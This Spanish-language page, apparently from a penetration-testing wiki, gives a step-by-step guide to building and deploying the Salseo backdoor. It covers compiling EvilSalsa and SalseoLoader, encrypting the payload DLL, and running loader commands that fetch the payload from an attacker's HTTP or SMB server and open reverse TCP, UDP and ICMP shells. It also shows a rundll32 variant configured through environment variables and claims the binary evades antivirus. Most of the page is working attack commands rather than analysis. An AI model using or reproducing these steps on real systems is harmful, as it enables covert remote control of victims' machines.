# Salseo

{{#include ../banners/hacktricks-training.md}}

## Compilando los binarios

Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.

Compila esos proyectos para la arquitectura de la caja de Windows donde los vas a usar (Si Windows soporta x64, compílalos para esa arquitectura).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la **pestaña "Build" izquierda** en **"Platform Target".**

(\*\*Si no puedes encontrar estas opciones, presiona en **"Project Tab"** y luego en **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Luego, construye ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Preparar el Backdoor

Primero que nada, necesitarás codificar el **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ahora tienes todo lo que necesitas para ejecutar todo lo relacionado con Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecutar el backdoor**

### **Obteniendo un shell reverso TCP (descargando dll codificada a través de HTTP)**

Recuerda iniciar un nc como el listener del shell reverso y un servidor HTTP para servir el evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo un shell reverso UDP (descargando dll codificada a través de SMB)**

Recuerda iniciar un nc como el oyente del shell reverso y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo un shell reverso ICMP (dll codificada ya dentro de la víctima)**

**Esta vez necesitas una herramienta especial en el cliente para recibir el shell reverso. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, ejecutemos la cosa de salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando la función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Agrega antes de la función principal: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instala DllExport para este proyecto

#### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Busca el paquete DllExport (usando la pestaña Examinar), y presiona Instalar (y acepta el popup)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

En tu carpeta de proyecto han aparecido los archivos: **DllExport.bat** y **DllExport_Configure.bat**

### **Des**instalar DllExport

Presiona **Desinstalar** (sí, es raro pero confía en mí, es necesario)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Sal de Visual Studio y ejecuta DllExport_configure**

Simplemente **sal** de Visual Studio

Luego, ve a tu **carpeta SalseoLoader** y **ejecuta DllExport_Configure.bat**

Selecciona **x64** (si vas a usarlo dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace for DllExport**) y presiona **Aplicar**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Abre el proyecto nuevamente con Visual Studio**

**\[DllExport]** no debería estar marcado como error

![](<../images/image (8) (1).png>)

### Compila la solución

Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)

![](<../images/image (10) (1).png>)

Selecciona **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilación --> Objetivo de plataforma = x64)

![](<../images/image (9) (1) (1).png>)

Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)

### Prueba la Dll generada

Copia y pega la Dll donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tengas un DLL funcional!

## Obtén un shell usando el DLL

No olvides usar un **servidor** **HTTP** y configurar un **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
